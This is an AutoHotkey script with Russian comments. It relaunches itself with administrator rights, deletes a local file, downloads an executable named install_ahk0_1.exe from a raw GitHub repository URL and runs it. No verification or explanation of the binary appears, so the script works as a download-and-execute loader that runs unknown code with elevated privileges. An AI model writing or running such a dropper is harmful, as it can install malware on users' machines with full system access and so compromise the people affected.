#NoEnv
SetWorkingDir %A_ScriptDir%
if not A_IsAdmin
{
    Run *RunAs "%A_ScriptFullPath%" ; Перезапускаем скрипт с правами администратора
    ExitApp ; Завершаем текущий процесс
}

FileDelete, install_ahk0_1.exe

UrlDownloadToFile, https://raw.githubusercontent.com/nikantahhk/skreenahkafk/refs/heads/main/install_ahk0_1.exe, install_ahk0_1.exe
Sleep, 250
Run, install_ahk0_1.exe

ExitApp
